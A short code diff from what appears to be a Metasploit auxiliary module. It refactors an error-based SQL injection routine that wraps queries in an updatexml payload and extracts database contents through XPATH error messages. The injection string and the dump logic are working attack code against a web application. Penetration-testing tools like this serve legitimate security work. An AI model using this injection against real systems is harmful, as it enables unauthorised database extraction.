@@ -84,7 +84,7 @@ class MetasploitModule < Msf::Auxiliary
         'pid' => '1',
         'doc_type' => '1',
         'doc_id' => '1',
-        'enc' => payload
+        'enc' => "1' and updatexml(1,concat(0x7e, (" + payload + ")),0) or '"
       }
     )
   end
@@ -105,13 +105,11 @@ class MetasploitModule < Msf::Auxiliary
 
   def dump_all
     sqli_opts = {
-      prefix: "1' and updatexml(1,concat(0x7e, (",
-      suffix: ")),0) or '",
       truncation_length: 31, # slices of 31 bytes of the query response are returned
       encoder: :base64, # the web application messes up multibyte characters, better encode
       verbose: datastore['VERBOSE']
     }
-    sqli = MySQLi.new(sqli_opts) do |payload|
+    sqli = MySQLi::Common.new(sqli_opts) do |payload|
       res = get_response(payload)
       if res && (response = res.body[%r{XPATH syntax error: '~(.*?)'</font>}m, 1])
         response
